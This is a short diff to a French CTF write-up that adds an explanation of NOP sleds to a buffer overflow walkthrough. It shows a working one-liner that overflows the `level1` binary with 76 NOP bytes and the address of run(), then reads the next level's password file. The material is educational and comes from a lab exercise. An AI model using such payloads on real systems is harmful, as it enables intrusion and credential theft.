@@ -119,7 +119,9 @@ Je peux donc maintenant construire mon "payload infecté" de cette manière :
 buffer -> ebp    adresse de run()
 ```
 
-Et l'utiliser sur le binaire `level1` tel quel :
+`\x90` représente un `NOP` (no operation) et est l'instruction idéale pour le padding, puisqu'elle permet de préserver l'alignement de la mémoire. Ce pattern s'appelle un `NOP sled`.
+
+J'utilise le payload sur le binaire `level1` :
 
 ```bash
 $ (python -c 'print("\x90" * 76 + "\x08\x04\x84\x44"[::-1])' && echo 'cat /home/user/level2/.pass') | ./level1
